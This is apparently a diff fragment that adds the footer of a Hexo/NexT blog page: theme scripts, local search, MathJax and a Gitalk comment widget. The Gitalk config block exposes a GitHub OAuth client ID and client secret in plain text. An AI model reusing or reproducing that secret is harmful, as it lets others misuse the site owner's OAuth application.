+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.1/es5/tex-mml-chtml.js","integrity":"sha256-hlC2uSQYTmPsrzGZTEQEg9PZ1a/+SV6VBCTclohf2og="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"juhyun167","repo":"juhyun167.github.io","client_id":"97ef06bf938b3dfb0c5b","client_secret":"210c90c45a592282824bbc4312dbc74b3709bbea","admin_user":"juhyun167","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"en","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"a1d5e56fe02508eb308bb135c15035d2"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
